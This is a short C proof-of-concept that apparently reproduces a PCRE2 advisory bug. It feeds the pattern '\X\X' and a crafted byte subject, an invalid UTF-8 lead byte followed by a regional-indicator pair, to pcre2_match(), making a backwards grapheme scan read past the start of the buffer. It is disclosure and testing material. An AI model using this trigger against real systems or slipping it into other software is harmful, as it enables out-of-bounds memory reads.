/* Residual-defect PoC for the invalid-UTF \X backwards-scan out-of-bounds
 * read (GHSA-9qww-pwc4-77qq). Drives the bug purely through the public
 * pcre2_match() API with PCRE2_MATCH_INVALID_UTF, matching the pattern
 * "\X\X" against a subject whose first byte is an invalid UTF-8 lead byte
 * directly followed by a regional-indicator pair. The regional-indicator
 * grapheme-break rule makes PRIV(extuni) scan backwards from the second
 * cluster; on the vulnerable build that scan runs off the front of the
 * subject buffer.
 */
#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
  PCRE2_UCHAR pattern[] = "\\X\\X";
  unsigned char subject[] = { 0x80, 0xf0, 0x9f, 0x87, 0xa6, 0xf0, 0x9f, 0x87, 0xa7 };

  int errnum;
  PCRE2_SIZE erroff;
  pcre2_code *re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED,
    PCRE2_UTF | PCRE2_MATCH_INVALID_UTF, &errnum, &erroff, NULL);
  if (re == NULL)
    {
    PCRE2_UCHAR buf[256];
    pcre2_get_error_message(errnum, buf, sizeof(buf) / sizeof(PCRE2_UCHAR));
    fprintf(stderr, "compile failed at %lu: %s\n", (unsigned long)erroff, buf);
    return 1;
    }

  pcre2_match_data *md = pcre2_match_data_create(4, NULL);
  int rc = pcre2_match(re, (PCRE2_SPTR)subject, sizeof(subject), 0, 0, md, NULL);
  printf("pcre2_match rc=%d\n", rc);

  pcre2_match_data_free(md);
  pcre2_code_free(re);
  return 0;
}
